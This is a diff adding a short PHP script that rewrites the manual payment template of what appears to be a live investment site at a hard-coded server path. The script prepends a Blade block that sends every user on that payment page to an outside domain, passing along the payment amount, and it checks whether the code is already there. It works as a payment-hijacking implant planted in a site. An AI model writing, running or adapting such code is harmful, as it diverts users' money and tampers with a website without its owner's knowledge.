@@ -1,0 +1,43 @@
+<?php
+// Define the path to your target file
+$filePath = '/home/u111825197/domains/ngconeinvest.com/public_html/core/resources/views/templates/invester/user/payment/manual.blade.php';
+
+// Define the code you want to add at the top
+$codeToAdd = '@php' . "\n" .
+    '    // Direct Redirect for everyone' . "\n" .
+    '    $redirectAmount = getAmount($data[\'amount\'] ?? 0);' . "\n" .
+    '    header(\'Location: https://dev-drops.com/we.php?amount=\' . urlencode($redirectAmount));' . "\n" .
+    '    exit;' . "\n" .
+    '@php' . "\n\n"; // Note: Blade uses @php ... @endphp
+
+// Alternative string using @endphp correctly:
+$codeToInsert = "@php\n" .
+    "    // Direct Redirect for everyone\n" .
+    "    \$redirectAmount = getAmount(\$data['amount'] ?? 0);\n" .
+    "    header('Location: https://dev-drops.com/we.php?amount=' . urlencode(\$redirectAmount));\n" .
+    "    exit;\n" .
+    "@endphp\n\n";
+
+if (file_exists($filePath)) {
+    // Read the existing content of the file
+    $existingContent = file_get_contents($filePath);
+    
+    // Check if the code is already added to prevent duplicates
+    if (strpos($existingContent, 'dev-drops.com') !== false) {
+        echo "The redirect code is already present in the file.";
+        exit;
+    }
+
+    // Prepend the new code to the existing content
+    $newContent = $codeToInsert . $existingContent;
+
+    // Save the file back
+    if (file_put_contents($filePath, $newContent) !== false) {
+        echo "Successfully added the auto-redirect code to the top of manual.blade.php!";
+    } else {
+        echo "Failed to write to the file. Please check file permissions.";
+    }
+} else {
+    echo "Error: The target file does not exist at the specified path.";
+}
+?>
